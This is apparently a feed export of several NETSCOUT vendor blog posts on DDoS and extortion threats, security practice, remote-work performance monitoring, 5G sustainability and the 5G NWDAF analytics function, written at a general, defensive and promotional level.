<p>When it comes to combatting distributed denial-of-service (DDoS) and ransomware attacks, threat intelligence is vital. According to Hardik Modi, associate vice president of threat and mitigation for NETSCOUT, threat intelligence is the study of the bad actors who perpetrate these attacks, along with the tactics and tools they use. “What we do collectively is study what our adversaries are doing, why they are doing it, and how they are doing it,” explained Modi. “Our objective is to gather threat intelligence that will better inform and protect our customers.”</p>

<p>“What we do at ASERT is study the attackers and the attack methodologies, homing in on the tactics they’re using and the types of targets that they’re going after,” added Richard Hummel, threat intelligence manager for <a data-entity-substitution="canonical" data-entity-type="node" data-entity-uuid="b0284809-4eb5-4d90-9897-6f27d22e9a77" href="http://localhost:7996/asert" title="ASERT">NETSCOUT’s ATLAS Security Engineering and Response Team (ASERT)</a>. “And then we turn that knowledge into actionable threat intelligence that is pushed out into our solutions, so our customers can have access to that expertise in such a way that they can use it to make forwarding or drop decisions about packets on their network in order to actively defend against those threats.”</p>

<p>That actionable insight is crucial for <a data-entity-substitution="canonical" data-entity-type="node" data-entity-uuid="4dbce3cf-7733-47a9-96be-6afc3fa09c28" href="http://localhost:7996/what-is-ddos" title="What Is a Distributed Denial of Service (DDoS) Attack?">defending against DDoS attacks</a>. There were more than 10 million DDoS attacks in 2020 alone, and that record-setting pace continued into 2021.</p>

<p><strong>DDoS Extortion Attacks</strong></p>

<p>One pernicious new form of attack recently on the rise <a data-entity-substitution="canonical" data-entity-type="node" data-entity-uuid="b0a47571-ee6b-465b-99d7-b97dccbf5156" href="http://localhost:7996/extortion" title="DDoS Extortion Attack Protection">DDoS extortion</a>. In these cases, the attacker launches a demonstration attack against the victim and then follows up with an extortion demand. This demand typically states that the attacker has a lot more DDoS capacity and will direct that capacity at the victim if the extortion payment isn’t made. Indeed, respondents to the 16<sup>th</sup> annual Worldwide Infrastructure Security Report (WISR) reported a 125 percent increase in such attacks.</p>

<p>In the newest wrinkle, cyberattackers are using triple extortion tactics, combining data encryption, data exfiltration, and DDoS attacks to create a three-pronged attack that increases the likelihood of the victim complying with the ransom demand. In today’s increasingly fraught threat landscape, “Organizations have to be prepared to defend themselves against attacks 24 by 7 by 365,” explained Roland Dobbins, principal engineer of ASERT. This requires having a plan in place, successfully executing that plan, and regularly evaluating the effectiveness of the plan to strengthen it against subsequent attacks. The good news is, preparation pays off.</p>

<p>Modi suggested one additional consideration. “Ultimately, the fundamental aspect of DDoS defense is knowing your own network,” he concluded. “When it comes down to defending yourself, there’s information we can provide that is very useful, but a lot of it will come down to knowing what your services look like and what they depend on, and then using effective solutions to fine-tune the correct level of defense. Threat intelligence is essentially a way of testing your defenses, so you can enhance them.”</p>

  <content:encoded><![CDATA[<p>Students have just returned to classrooms all over the United States in what will now be the third academic year affected by the COVID-19 pandemic. The impact on the <a href="https://www.netscout.com/solutions/higher-education">education ecosystem</a> unfolded in front of our eyes, with emergency purchases of devices for students to attend school remotely, tools for efficient teaching by remote educators, expanded use of applications for conferencing and collaboration, broadband and internet growth and access for the users and the data centers to support digital connectivity, and even security to protect availability to the applications and services.</p>

<p>As students and teachers largely return to classrooms this year with remote-learning technology already in place should it be required, several challenges of the last 18 months no longer exist. However, two issues now take priority: <a href="https://www.netscout.com/blog/federal-funding-school-technology">performance problems</a> and <a href="https://www.netscout.com/blog/threat-actors-target-remote-learning-during-covid-19">security threats</a>.&nbsp;</p>

<p>As a recent from the Center for Digital Education reports, security threats on educational systems have increased dramatically throughout the same period. <a href="https://www.netscout.com/what-is-ddos">Distributed denial-of-service</a> (DDoS) attacks, by either disruptive students or threat actors, require vigilant, sophisticated detection and remediation.</p>

<p>Simultaneously, the latest shift in network and application utilization caused by users accessing school district data centers, local application services, and cloud-based applications and collaboration tools will impact performance. Monitoring and understanding these new traffic patterns will help the IT staff for these educational institutions troubleshoot problems quickly, while also better managing bandwidth and associated budgets.&nbsp;</p>

<p>Recent federal legislation has made procuring and implementing these security and performance solutions more accessible, and the Center for Digital Education has provided an overview of how to take advantage of these resources.&nbsp;</p>

  <title>4 Things to Focus on for Cybersecurity Awareness Month</title>
  <link>http://localhost:7996/blog/4-things-focus-cybersecurity-awareness-month</link>
  <description>With the arrival of National Cybersecurity Awareness month, now is a good time to think about the measures we should all be taking to improve our security practices.</description>
  <content:encoded><![CDATA[<p>With the arrival of National<a href="https://www.netscout.com/cybersecurity-awareness"> Cybersecurity Awareness month</a>, now is a good time to think about the measures we should all be taking to improve our security practices. This is all the more important with so many people continuing to work from home. Security Operations teams need to educate employees about the risks to vital enterprise assets.</p>

<p>Here are a few things to keep in mind when it comes to security:</p>

<ol>
	<li><strong>Kids can be a risk factor</strong>. While it is not a typically recommended cybersecurity practice, some people do allow their children to use their office laptops while at home. This can expose sensitive enterprise data to cyber infiltration, theft, or compromise. Being certain that technical controls are in place, patches applied, and that data is always encrypted is the first line of defense. This is particularly important because while we may be savvy enough to avoid falling for phishing and other cybersecurity threats, our children may unsuspectingly click on a malicious link, exposing the laptop and the network to an attack. The same risk exists with mobile devices. Kids often use their parent’s smart phones, which could expose sensitive business data such as contacts, should a downloaded app or movie be used to surreptitiously steal information (such as all your business contacts–free is not free).</li>
	<li><strong>Build audit/governance processes for third-party partners and vendors. </strong>Nearly every enterprise has third-party software installed within their network. For this reason, it is important to review how your supply chain interconnects and evaluate the strength of cybersecurity hygiene within partners and vendors. Obviously, it is not possible to vet every aspect of a partner’s cybersecurity practices and processes, which is why it’s also crucial to put safeguards in place within your own systems. Running next-generation security tools that leverage packet data can provide insights into possible incursions and changes to networks and infrastructure, offering early alerts to security and network operations teams.</li>
	<li><strong>Make risk assessment part of your change management process</strong>. Because most enterprises frequently upgrade systems and add to their networks, it is imperative to make sure those changes are reflected in your security solutions. Part of the change management process should include a cybersecurity risk assessment to ensure security concerns are addressed and patches made before the changes occur. A regular security audit is also highly advisable to uncover missed vulnerabilities. Fortunately, there are good automated tools available today that can help with this extensive auditing process.</li>
	<li><strong>Re-evaluate your company’s risk profile. </strong>Due to the shifting dynamics of the workplace brought on by the pandemic, enterprises should regularly reassess their risk profiles to determine where major risks exist. The enterprise risk assessment process typically occurs once a year, but given the pace of change and the growing threat horizon, businesses might be well advised to conduct more frequent evaluations to stay ahead of potential threats and keep up with new security approaches and advanced solutions.</li>
</ol>

<p>While <a href="https://horizon.netscout.com">cybersecurity threats </a>are never going to go away, the good news is that measures being employed around the world to combat attacks are working. For every news story that reveals a high-profile attack, incursion, or theft, there are countless others that were thwarted because good cybersecurity hygiene practices were employed and effective tools were deployed to identify, isolate, and prevent the threat. Though they won’t garner any headlines, thousands of companies and cybersecurity professionals are winning battles each and every day. That should give hope to everyone.</p>

  <title>Work-From-Home Is Likely Here to Stay—What’s Your Strategy For User Experience?</title>
  <link>http://localhost:7996/blog/work-home-likely-here-stay</link>
  <description>IT needs to rethink monitoring strategies to identify key instrumentation vantage points and more effectively troubleshoot end-user experience and application performance issues.</description>
  <content:encoded><![CDATA[<p>As businesses adapt to the shifting tides of the COVID-19 pandemic, the very nature of where employees will work in the future remains in flux. Although some employers may have mixed feelings about this, employees have strong preferences. In a recent <a href="https://www.forbes.com/sites/ashiraprossack1/2021/02/10/5-statistics-employers-need-to-know-about-the-remote-workforce/?sh=540c0a35655d"><em>Forbes</em></a> report, 74 percent of professionals indicated they believe working from home will <a href="https://www.netscout.com/blog/many-remote-work-here-stay-can-it-deliver-user-expectations">become the new normal</a>. 61 percent of those surveyed stated they would prefer being fully remote, while<strong> </strong>97 percent suggested they would like some degree of flexibility in balancing a return to the office and remote work. This data suggests many employers will likely embrace a hybrid model of work in order to attract new hires and retain existing talent.</p>

<p>Of course, this continued reliance on remote work has much larger implications for IT organizations, which must assure the end-user experience regardless of where employees work. As these employees increasingly rely on remote access to services hosted by corporate networks, including data center-based voice systems, as well as web applications, it becomes considerably more challenging to guarantee the reliability, responsiveness, and quality of that end-user experience regardless of location or how those users are connecting.</p>

<p>Whether it’s a remotely-based engineer accessing a manufacturing application, a healthcare worker checking medical records in a hosted application, or a bank manager using a data center-based unified communication and collaboration (UC&amp;C) application to call a regional office regarding a loan origination, the quality of the connection is absolutely crucial. The ability of IT to troubleshoot problems and assure the highest quality of service can directly impact a business’s ability to generate revenue, support the customer, and avoid compliance penalties.</p>

<p><strong>The Implications of Cloud Migration on Digital Employee Experience </strong></p>

<p>Many IT organizations have embarked on workload migration projects, moving services to the cloud and infrastructures to co-locations, and adopting new software-as-a-service (SaaS) applications, such as unified communications as a service (UCaaS). This in turn has created tremendous complexity, making it more difficult for IT to gain the visibility and control needed to troubleshoot and address performance problems quickly in order to ensure the best digital employee experience.</p>

<p>In the case of UCaaS, many companies are using more than one platform, which further complicates the process of keeping services performing flawlessly. IT simply can’t rely on the vendor’s management tool in each instance. ISPs, corporate networks, WAN providers, and even corporate IP-based phone systems all can have infinite paths that communications can follow, which creates immense complexity. Such next-generation corporate infrastructures are more of an ecosystem of different environments, which leaves IT dealing with an explosion of edges.</p>

<p><strong>Too Many Edges, Too Little Time </strong></p>

<p>Each environment has its own edge. The three general areas for visibility include the client edge, network edge, and data center/cloud service edge. As traffic moves between each edge, it is often altered to accommodate the next domain. So, for example, traffic going from wireless to wired connections, or LAN to WAN, or ISP to co-lo, co-lo to cloud, or cloud to server workload presents a potential gap in visibility. Importantly, these edges can turn into roadblocks that impede a remote worker’s productivity. With so many potential edges involved in any given application service, it is imperative for IT to have vendor-agnostic visibility in order to rapidly pinpoint issues.</p>

<p>IT needs to rethink monitoring strategies, identifying key instrumentation vantage points to more effectively troubleshoot end-user experience and application performance issues. Combining both packet data and synthetic test technologies for monitoring at these different edges is the key to success in today’s complex, multi-cloud environments.</p>

<p><strong>The Case for Smart Edge Monitoring</strong></p>

<p>Synthetic testing, which includes business transaction testing capabilities, is a highly effective means for simulating the typical interactions an end-user has with applications across an enterprise environment. Such testing can be conducted on a scheduled, consistent basis, with results providing IT with detailed performance and availability analysis of specific applications, as well as of the network. Tests can be configured for data center-based traditional applications in server farms, SaaS applications, UCaaS solutions, and Wi-Fi or local Ethernet networks at remote locations.</p>

<p>The beauty of business transaction testing is that many times it can detect an emerging problem and then alert IT, allowing them to turn to a packet monitoring solution to determine where the slowdown is occurring. This in turn enables faster resolution so there is less of an impact on the end-user.</p>

<p>NETSCOUT is a leader when it comes to smart edge monitoring. Our Smart Edge Monitoring solution provides comprehensive, borderless monitoring and visibility. This unique solution combines and extends the benefits of nGeniusONE’s Service Assurance platform with nGeniusPULSE’s proven synthetic testing to provide critical insights into the end-user experience. Our Adaptive Service Intelligence (ASI) technology combines the test traffic with packet monitoring traffic to provide an unparalleled perspective of the service delivery and user experience. This is the ideal solution for ensuring that work-from-home professionals are able to have the best digital employee experience with any application, anywhere.</p>

  <title>5 Steps for Improving Collaboration Between IT and Security Teams</title>
  <link>http://localhost:7996/blog/improving-it-and-security-teams-collaboration</link>
  <description>With today’s rapidly expanding threat landscape, aligning IT and security teams to build better communications and cooperation is critical.</description>
  <content:encoded><![CDATA[<p><em>Part two of a two-part series</em></p>

<p>As <a href="https://www.netscout.com/blog/four-network-security-challenges-watch">threats from cyberattacks increase by the day</a>, the need to defend and protect vital assets and network systems also grows more urgent. Unfortunately, <a href="https://www.netscout.com/blog/why-do-it-and-cybersecurity-teams-struggle-collaborate">friction between IT and security</a> teams can hamper efforts to put an effective strategy in place. With today’s rapidly expanding threat landscape, it is critical to align IT and security teams to ensure better communication and cooperation.</p>

<p>For example, creating integrated IT and security operations teams can be instrumental in ensuring complete alignment and accountability. Such teams can review and vet policies to be certain security is deployed seamlessly and collectively.</p>

<p><a class="tweetabletext" href="http://twitter.com/intent/tweet?text=With%20today%E2%80%99s%20rapidly%20expanding%20threat%20landscape,%20it%20is%20critical%20to%20align%20IT%20and%20security%20teams%20to%20ensure%20better%20communications%20and%20cooperation.%20-%20Read%20more%20at%20@NETSCOUT&amp;url=https://www.netscout.com/node/add/blog" rel="0" target="_blank">With today’s rapidly expanding threat landscape, it is critical to align IT and security teams to ensure better communications and cooperation. - Read more at @NETSCOUT</a>In the recent WSJ Pro Cybersecurity <a href="https://vimeo.com/569934447">webinar</a> “Aligning IT and Cybersecurity,” sponsored by NETSCOUT, several industry experts shared suggestions on how to improve IT and security cooperation to achieve better security results.</p>

<p><strong>5 Steps to Improve IT and Security Team Effectiveness </strong></p>

<ol>
	<li><strong>Create a security ambassador or champion program.</strong> According to Sanjay Macwan, chief information officer (CIO) and chief information security officer (CISO) at Vonage, “By bringing in experts from different functional areas of the organization—such as security, IT, operations, engineering, etcetera—who have an understanding of the complexity of security, it becomes possible to create a sounding board for the organization.” Macwan suggests that when <a href="https://www.netscout.com/blog/collaboration-makes-cybersecurity-dream-work">new tools, technologies, or controls</a> are being considered, stakeholders can examine the additions from varying perspectives to ensure the organization makes the optimum decision.</li>
	<li><strong>Don’t let security be a fortress.</strong> It’s important for the security organization to foster an open-door policy that encourages anybody in the company to come in and share ideas, problems, and concerns. The security team should be easily approachable. Having transparency and trust throughout the organization is key to advancing the mission of security while balancing the need for agility around service and product delivery.</li>
	<li><strong>The business is security’s business.</strong> The entire security organization needs a solid understanding of the business, as well as the technology stack used to deliver services and products. When discussing a technology, control, or security solution with engineering and IT teams, security teams will work smarter when they have a deeper understanding of the implications to the business, rather than simply seeing things through a security lens.</li>
	<li><strong>Collaboration between CIO and CISO is vital.</strong> Alvina Antar, CIO for Okta, stated that “CIOs and CISOs need to collaborate effectively in order to gain alignment and achieve clarity around roles and responsibilities, as well as to reduce budget friction. By working together, and making major decisions around priorities with a collective voice, IT and security considerations can be more affectively tackled.” Antar believes such alignment makes it easier to view the bigger picture and make adjustments as needed to achieve the best outcome for the organization.</li>
	<li><strong>Align IT and security when presenting to the board.</strong> “IT and security teams need to be aligned when presenting challenges, progress, and needs to technology committees or audit committees, as well as to the board,” Macwan concluded. “It is crucial to be able to share the right level of details and information in order to align with company objectives and ensure support from the top of the organization.”</li>
</ol>

<p>Escoute Consulting President Mark Thomas pointed out that it is important for CIOs and CISOs to consider their mutual roles as interdependent. “A lot of CIOs and CISOs think ‘If something goes wrong, how am I going to keep from having the finger pointed at me?’ Instead, I believe they should be more focused on building alignment and a relationship structure between the two roles that is founded on trust and cooperation.”</p>

  <title>Are DDoS Threats Keeping You Awake at Night? </title>
  <link>http://localhost:7996/blog/are-ddos-threats-keeping-you-awake-night</link>
  <description>DDoS attacks will continue to increase in volume, complexity, and impact. SPs need modern DDoS threat mitigation strategies that protect the integrity of service and enhance the business.</description>
  <content:encoded><![CDATA[<p>Not that anyone expected distributed denial-of-service (DDoS) attacks to wane during the COVID-19 pandemic, but the shift to at-home work and greater reliance on remote network connectivity has in fact led to a marked acceleration in daily threats. For service providers, who are tasked with delivering reliable service in support of cloud services, edge computing, Internet of Things (IoT) devices, mobile users, and distributed data sets, dealing with the expanded security perimeter and threat vectors of today’s enhanced network environment is enough to keep their security professionals awake at night.</p>

<p>As if containing capital and operating costs weren’t enough, service providers must also deal with the ever-present and ever-shifting threat of DDoS attacks, perpetrated by bad actors intent on finding new ways to disrupt and extort businesses. Mitigating such attacks has always proven to be difficult and costly in its own right. As a result, service providers need a modern DDoS mitigation strategy to detect and defend against an increasingly sophisticated adversary.</p>

<p><strong>Taking a Distributed Approach to DDoS Detection and Mitigation </strong></p>

<p>The more traditional approach of taking a centralized DDoS mitigation strategy against attacks is simply not sufficient against this formidable onslaught. Because of the size and complexity of service provider networks, communications often navigate across multiple links, creating exposures to attack that are increasingly difficult to defend. Instead, what is need is a distributed network defense approach to DDoS detection and mitigation that can identify attacks and critical metadata, enabling a rapid response. Such a defense should be able to inspect traffic, analyze the threat, and filter out suspect traffic at every endpoint and connection within the provider’s network.</p>

<p>As service providers increasingly focus on cloud services, edge computing, end users, and endpoint devices, the traditional approach of utilizing distributed detection solutions in concert with centralized mitigation centers within the network simply won’t cut it. However, mitigation measures that are distributed out to the network edge necessitate both infrastructure and intelligent defense capabilities that are capable of working hand in hand across locations and platforms.</p>

<p>A more modern DDoS threat mitigation strategy involves distributing both detection and mitigation functions throughout the network to intercept threats nearer to the source. In this way, network operators can stop attacks upstream, instead of having to incur the cost of peering and transit link traffic that is only going to be discarded once it reaches a centralized scrubbing center. By conducting the scrubbing as close as possible to the threat source, service providers can reduce any potential impact to traffic, helping to ensure high-quality service.</p>

<p><strong>Increasing Service Value for Subscribers</strong></p>

<p>An edge-based strategy for DDoS defense is advantageous for service providers beyond the efficacy of mitigating threats: It also can improve service value for subscribers. By speeding up detection and response to DDoS attacks, providers are able to assure service availability and reliability, enhancing the customer experience, reducing customer churn, improving stickiness, and growing revenue.</p>

<p>And because modern DDoS defense solutions take advantage of automation, threat intelligence, and distributed mitigation infrastructure, they are able to be more proactive, while reducing the burden on security resources. This frees up service provider staff to be more productive and efficient.</p>

<p>There is no doubt that DDoS attacks will continue to increase in volume, complexity, and bottom-line impact. For that reason, service providers will need to fight back with modern DDoS threat mitigation strategies that can protect the integrity of their service and offer an opportunity to enhance the business.</p>

  <title>Packet Data Adds Increasing Value to Next-Gen Cybersecurity </title>
  <link>http://localhost:7996/blog/packet-data-adds-value-cybersecurity</link>
  <description>A recently published report from the SANS Institute highlighted the growing value of network-derived data for enterprise cybersecurity teams tasked with protecting increasingly distributed corporate infrastructures.</description>
  <content:encoded><![CDATA[<p>A recently published report from the SANS Institute highlighted the growing value of network-derived data for enterprise cybersecurity teams tasked with protecting increasingly distributed corporate infrastructures. Entitled “Advance Your Security Posture with Comprehensive Network Visibility,” the paper revealed a trend toward leveraging network traffic data to improve the overall cybersecurity posture of the world’s largest businesses and governmental organizations.</p>

<p><a class="tweetabletext" href="http://twitter.com/intent/tweet?text=Organizations%20are%20looking%20to%20gain%20deeper%20visibility%20across%20the%20entire%20infrastructure%20(cloud%20and%20on%20premises)%20for%20operational%20and%20security%20reasons.%20-%20Read%20more%20at%20@NETSCOUT&amp;url=https://www.netscout.com/node/91071" rel="0" target="_blank">Organizations are looking to gain deeper visibility across the entire infrastructure (cloud and on-premises) for operational and security reasons. - Read more at @NETSCOUT</a></p>

<p>“Organizations are looking to gain deeper visibility across the entire infrastructure (cloud and on-premises) for operational and security reasons. Additionally, security teams are looking to reduce the time it takes to detect, investigate, and remediate cyber and/or other IT threats, with the ultimate business goal of reducing IT risk,” noted the report, which went on to list several factors that illustrate the value of collecting and analyzing network information for security analytics, including the following:</p>

<p><strong>The unique nature of the network. </strong>The network (data, traffic, and packets) itself cannot be evaded—traffic must flow across it. Moreover, it is extremely difficult to manipulate. And because it is always on, it provides a constant flow of network information. And that data can’t be deleted or modified.</p>

<p><strong>An environment view. </strong>Network data can reveal patterns of behavior across multiple systems, giving security the ability to see across an ecosystem rather than discreet systems. Network data provides the capability to focus on strategic points in the network for maximum visibility—security operations teams can use metadata and, ultimately, packets for contextual investigations, remediations, and policy updates.</p>

<p><strong>The value of network metadata. </strong>Although many traditional security approaches tend to emphasize full packet data, large environments with significant traffic are also realizing significant benefits of network metadata. Analyses of both packets and metadata will prove invaluable in building a comprehensive network monitoring function that emphasizes behaviors and potentially highlights attacker dwell time.</p>

<div style="float:right; padding:20px; margin: 0 0 30px 30px; max-width:50%; font-size:0.9rem; background:#eff0f0">
<p><strong>Data lakes will also bloat and suffer from significant storage needs.</strong></p>

<p>The average time to identify and contain a breach (its dwell time or “lifecycle”) was 280 days, according to a 2020 study from the Ponemon Institute. The lifecycle of a breach factors heavily into the overall cost.</p>

<p><em>Source: <a href="https://www.netscout.com/blog/packet-data-adds-value-cybersecurity" target="_blank">Cost of a Data Breach Report</a>, Ponemon Institut</em></p>
</div>

<p><strong>Technologies that gather both metadata and packets.</strong> Modern solutions use high-speed capture mechanisms, compression, network traffic enhancement, and analytics techniques to provide longer-term network packet and metadata retention. Together, these improved methodologies immediately provide much more comprehensive visibility and retroactive analysis capabilities to security operations center (SOC) analysts who may need during an investigation to go back weeks or even months to determine what types of events occurred<strong>.</strong> Additionally, solutions that provide both full packet data and network metadata will prove much more valuable over time.</p>

<p><strong>Smarter Analysis via Metadata </strong></p>

<p>Tier 1 analysts can quickly begin investigations by using metadata and behavioral patterns of traffic flow, escalating results to tier 2 or 3 analysts, who may then analyze full packets for more detailed evidence collection that helps solidify criticality of events, priorities, root cause, and more. This offers organizations with time-constrained SOC teams the best of both worlds: All analysts can immediately use data available to process and advance evidence with investigative workflows.</p>

<p>To comprehensively analyze network packets, the industry needs analysis of raw network traffic to be smarter and more contextual. Turning raw packets into useful network metadata requires traditional attributes such as source and destination ports and addresses, device types communicating, applications and services in use (including browsers and others), and application- or service-specific information (for example, DNS requests). These data sources and types, taken and analyzed in tandem, can significantly facilitate security operations such as threat hunting, intrusion detection, and network forensics.</p>

<p>In addition to these capabilities, the tools will need to be both robust enough to gather and store network metadata and packets and easier to use and manage, because security and cloud operations teams are already stretched thin.</p>

  <title>In a Remote Work World, UC&amp;C Performance is a Top Priority</title>
  <link>http://localhost:7996/blog/remote-work-world-ucc-performance-top-priority</link>
  <description>Learn how a law firm addressed end-user experience issues with their document management application and unified communications services to protect client revenue opportunities.</description>
  <content:encoded><![CDATA[<p>Everyone has heard the old adage, “time is money.” This holds particularly true for the legal profession, where billable hours and revenue may well be interchangeable. One can easily imagine the pressure IT organizations in law firms face when it comes to assuring the performance of their firm’s unified collaboration and communications (UC&amp;C), network, and application services.&nbsp;</p>

<p>During the pandemic, law firms relied heavily on UC&amp;C services such as phone and video conferencing for client consultations, making them crucial to revenue. Poor quality voice, video, and conferencing services could negatively impact billable hours, as law firms can’t bill a client for having to repeatedly set up a call, try to connect, hang up, and start over again.</p>

<p><a class="tweetabletext" href="http://twitter.com/intent/tweet?text=During%20the%20pandemic,%20companies%20relied%20heavily%20on%20UC&amp;C%20services%20such%20as%20phone%20and%20video%20conference%20services%20for%20client%20consultations,%20making%20them%20crucial%20to%20revenue.%20-%20Read%20more%20at%20@NETSCOUT&amp;url=https://www.netscout.com/node/add/blog#browser" rel="0" target="_blank">During the pandemic, companies relied heavily on UC&amp;C services such as phone and video conference services for client consultations, making them crucial to revenue. - Read more at @NETSCOUT</a>However, the pressure goes to an even higher level when the application suffering performance issues is the firm’s document management system (DMS), which is used for hosting all their client information, case files, client briefs, and court filings. Delays in accessing and updating these documents creates a gap in billable time while simultaneously impacting staff productivity.&nbsp;</p>

<p>Imagine a firm of 2,000 attorneys and thousands more in paralegals and staff that charges $500 per hour. Now imagine that each employee loses one billable hour a month due to problems with their DMS and/or UC&amp;C services. The financial impact could easily reach six or seven digits. Avoiding this is clearly a top priority.</p>

  <title>(5)G Also Stands for Green!</title>
  <link>http://localhost:7996/blog/big-5g-event</link>
  <description>Carriers are spending billions to enable 5G services. Can they help the environment and underserved populations while generating ROI for their investments? Yes.</description>
  <content:encoded><![CDATA[<p>Mobile carriers have spent billions of dollars on new radio spectrum for their 5G deployments and billions more on new radio and core network infrastructure. So naturally, much of the discussion around 5G revolves around what <a href="https://www.netscout.com/solutions/5g#component--5">business cases and 5G-enabled services</a> will generate a <a href="https://www.netscout.com/success-stories/accelerate-your-5g-launch">robust ROI</a> from this massive investment.</p>

<p>But communications service providers (CSPs) also focus on using 5G (and the Gs to come) to solve social and environmental concerns—a big topic of conversation at the recent <a href="https://tmt.knect365.com/big-5g-event/">Big 5G</a> event in Denver, Colorado.</p>

<p><a class="tweetabletext" href="http://twitter.com/intent/tweet?text=At%20Big%205G,%20carriers%20talked%20about%20initiatives%20to%20not%20only%20provide%20expanded%20coverage%20to%20rural%20areas%20via%20terrestrial%20networks%20and%20low%20earth%20orbiting%20(LEO)%20satellites%20but%20also%20to%20offer%20less%20expensive%20services.%20-%20Read%20more%20at%20@NETSCOUT&amp;url=https://www.netscout.com/node/add/blog#browser" rel="0" target="_blank">At Big 5G, carriers talked about initiatives to not only provide expanded coverage to rural areas via terrestrial networks and low earth orbiting (LEO) satellites but also to offer less expensive services. - Read more at @NETSCOUT</a></p>

<p><strong>Closing the Broadband Divide </strong></p>

<p>Today, <a href="https://www.clarksvilleonline.com/2021/09/07/5g-can-help-solve-americas-broadband-divide/">almost 43 million Americans lack access</a> to internet broadband services. To address this challenge, CSPs and original equipment manufacturers (OEMs) want to make 5G networks and services more available to underserved populations. At Big 5G, carriers talked about initiatives to not only provide expanded coverage to rural areas via terrestrial networks and low earth orbiting (LEO) satellites but also to offer less expensive services. OEMs and other organizations, namely the Next G Alliance, also raised the need to repurpose existing equipment—from smartphones to network equipment. Not only does this expand the connected population, but it also helps companies conserve the environmentally sensitive materials used in the construction of these products.</p>

<p><strong>The Push for Sustainable Networks </strong></p>

<p>The movement to the cloud with 5G provides carriers with cost-effective compute resources, flexibility, and agility to increase service velocity. But running large server farms—not to mention cooling them—requires very large quantities of power. Carriers and cloud providers can help by looking at power consumption reductions and adopting new, sustainable power sources such as hydrogen fuel cells to power data centers and offices.</p>

<p>With automation driven by real-time closed-feedback loops to the orchestration layer, 5G can help manage the cloudified network to make sure cloud resources in the radio access network (RAN) and the core are used efficiently and cost-effectively. Such automation enables the network to “breathe” by spinning up and down network resources in response to changing traffic.</p>

<p>Most recently, Ericsson and Vodafone completed the first deployment of new energy-efficient 5G radio gear as part of a collaboration to improve network energy performance. The latest trial cut 5G network energy consumption in half. OEMs can further this work by continuing to develop cloud-optimized software that uses a smaller footprint with less compute and storage resources.</p>

<p><strong>Supporting Digitization and Work Location Transition</strong></p>

<p>As the world moves forward, dealing with the lingering impacts of COVID-19, 5G is further enabling remote work with higher bandwidth and lower latency for video conferencing and augmented reality/virtual reality (AR/VR) technologies for remote service technicians, medical applications, and many other work applications. An even bigger transformation may be the role 5G is playing with digitization changing the future of consumer and industrial communications. Moving data, intelligence and applications closer to users with mobile edge computing supports self-service as well as all aspects and logistics of the supply chain—including robotics for smart (and gig) factories.</p>

<p><strong>Protecting the Environment</strong></p>

<p>Aside from the increased reuse and recycling of smartphones and network equipment, there are many ways that CSPs can leverage 5G to benefit the environment:</p>

<ul>
	<li>Leveraging 5G sensors in farming (for vegetables and fruit) and vineyards (to reduce water consumption, detect leaks and contaminants, and meter chemical use), thereby helping growers use natural resources more efficiently while increasing yield and profits.</li>
	<li>Supporting smart city initiatives to reduce traffic and improve traffic flow (and thereby reducing greenhouse gases).</li>
	<li>Using 5G IoT devices to cut energy use in homes, offices, and schools. These devices can learn and anticipate human behaviors to put lighting and heating into sleep modes and manage peak demand periods.</li>
	<li>Deploying more sensors to help the efficiency of the electrical grid and smart manufacturing plants.</li>
</ul>

<p>All these examples and many more are enabled by the device density 5G supports.</p>

<p>Meeting all these social and environmental goals and initiatives along with maintaining the ongoing operation of the 5G network to deliver high-quality, revenue-producing services will be challenging for carriers. But with holistic visibility that facilitates proactive network management and predictive outcomes with automation, carriers have the potential not only to remain solvent but also to create a vibrant business that serves their customers and homes more completely.</p>

  <title>NWDAF Will Be Key to 5G Network Performance. But What Is It?</title>
  <link>http://localhost:7996/blog/nwdaf-will-be-key-5g-network-performance</link>
  <description>Learn about Network Data Analytics Function (NWDAF), a new function in the 5G core network responsible for providing network analysis information to network and application functions upon request.</description>
  <content:encoded><![CDATA[<p><i>By Rick Fulwiler and John English</i></p>

<p>Network Data Analytics Function (NWDAF) is a new 3GPP-defined analytics function in the 5G core network responsible for providing network analysis information to network functions and application functions upon request. It collects and analyzes data from user equipment, network functions, application functions, and operations and management (OAM) systems across the 5G core, cloud, edge networks, and radio access networks (RANs).</p>

<p>Equipped with specific automation techniques and AI algorithms, NWDAF uses data from network functions and application functions to provide near real-time analysis back to the network and application functions. NWDAF also provides predictive analysis that helps to proactively manage these functions with less human intervention.</p>

<p>NWDAF is one of several data analytics capabilities that comprise the analytics frameworks for the 5G core network. According to the <a href="https://5g-ppp.eu/wp-content/uploads/2019/07/5G-PPP-5G-Architecture-White-Paper_v3.0_PublicConsultation.pdf">5G-PPP Architecture Working Group View on 5G Architecture Version 3.0</a>, this analytics framework considers data analytics capabilities at various layers and introduces data analytics functions (DAFs) into the following:</p>

<ul><li>Core network domain (NWDAF)</li>
	<li>Big data and management and orchestration (big data/MDAF)</li>
	<li>Application function level (AFDAF)</li>
	<li>User equipment/RAN-DAF</li>
	<li>Data network (DN-DAF)</li>
</ul><p>In a heterogeneous environment such as 5G, it becomes important for each function to continuously evolve and provide better services to end-user devices. This can be achieved only if the functions in the 5G core act proactively and make real-time decisions, which in turn can provide necessary services to 5G consumers without delays. With a cloudified 5G network that is expected to support a huge number of devices, from smart phones to a myriad of IoT applications and devices, each network function must use automation to evolve toward self-optimization.</p>

<p>For example, DAFs could send key performance indicators to a policy control function if GTP packet delay exceeds a specific service level agreement governing quality of service for a given slice. Each logical data analytics module is implemented as multiple instances for different use cases and purposes. For instance, the big data/MDAF module could be implemented as multiple instances at different domain levels, such as RAN data analytics and VNF data analytics cross/intradomain. This framework allows for a dedicated data analytic module design at different layers, also enabling cross-layer optimization. Figure 1 depicts the overall integrated data analytics framework.</p>

<p><em><img alt="NWDAF Architecture" data-entity-type="file" data-entity-uuid="92a7cfe2-d7b5-4e04-88e9-f6dc41e39647" src="http://localhost:7996/sites/default/files/inline-images/CS-098-EN-2101-WEB.png" />Figure 1: NWDAF Architecture</em></p>

<p><strong>Phased Approach to NWDAF</strong></p>

<p>As with DAFs in general, NWDAF isn’t an off-the-shelf solution like a typical network equipment manufacturer (NEM) virtual function in 5G stand-alone (SA) architecture. It will have the core ability to acquire packets from the service-based interface and feed data to external functions and data repositories, but the analytics engine within will be highly programable based on whatever use case a mobile operator wants NWDAF to execute. This is a very important concept, because the mobile operator will still want very tight control of the 5G SA network. Engineering and operations teams will not, at this time, turn network control over to an AI engine without very specific human checks and balances in place.</p>

